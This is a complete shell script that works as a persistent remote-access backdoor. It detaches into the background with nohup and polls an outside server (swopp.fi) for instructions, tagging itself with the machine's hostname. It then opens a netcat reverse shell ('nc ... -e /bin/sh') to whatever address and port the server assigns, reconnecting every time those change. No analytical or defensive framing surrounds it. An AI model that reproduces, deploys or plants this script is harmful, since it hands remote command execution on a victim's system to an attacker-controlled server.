#!/bin/sh

# If the script is not already running in the background, run it with nohup
if [ "$1" != "background" ]; then
    nohup "$0" background > /dev/null 2>&1 &
    exit 0
fi

# Script variables
CLIENT_ID="machine_$(hostname)"
SERVER_URL="https://swopp.fi/bck/check.php"
CURRENT_ADDRESS=""
CURRENT_PORT=""
CONNECTED=0
CURRENT_PID=""

# Infinite loop to check for assigned address and port
while true; do
    # Send curl request and capture the response directly
    RESPONSE=$(curl -s "$SERVER_URL?id=$CLIENT_ID")

    # Parse JSON response using grep and cut if jq is not available
    NEW_ADDRESS=$(echo "$RESPONSE" | grep -o '"address":"[^"]*"' | cut -d':' -f2 | tr -d '"')
    NEW_PORT=$(echo "$RESPONSE" | grep -o '"port":"[^"]*"' | cut -d':' -f2 | tr -d '"')

    if [[ "$NEW_ADDRESS" != "null" && "$NEW_PORT" != "null" && -n "$NEW_ADDRESS" && -n "$NEW_PORT" ]]; then
        if [[ "$CONNECTED" -eq 0 || "$NEW_ADDRESS" != "$CURRENT_ADDRESS" || "$NEW_PORT" != "$CURRENT_PORT" ]]; then
            # If already connected, kill the old connection
            if [[ $CONNECTED -eq 1 ]]; then
                echo "New address or port detected. Stopping current connection to $CURRENT_ADDRESS:$CURRENT_PORT..."
                kill $CURRENT_PID
                CONNECTED=0
            fi

            # Start a new connection
            echo "Connecting to $NEW_ADDRESS:$NEW_PORT..."
            nc $NEW_ADDRESS $NEW_PORT -e /bin/sh > /dev/null 2>&1 &
            CURRENT_PID=$! # Save the PID of the current nc process
            CURRENT_ADDRESS=$NEW_ADDRESS
            CURRENT_PORT=$NEW_PORT
            CONNECTED=1
        else
            echo "Already connected. Continuing to monitor..."
        fi
    else
        echo "No assigned address found. Continuing to monitor..."
        CONNECTED=0
    fi

    # Wait for 20 seconds before checking again
    sleep 20
done
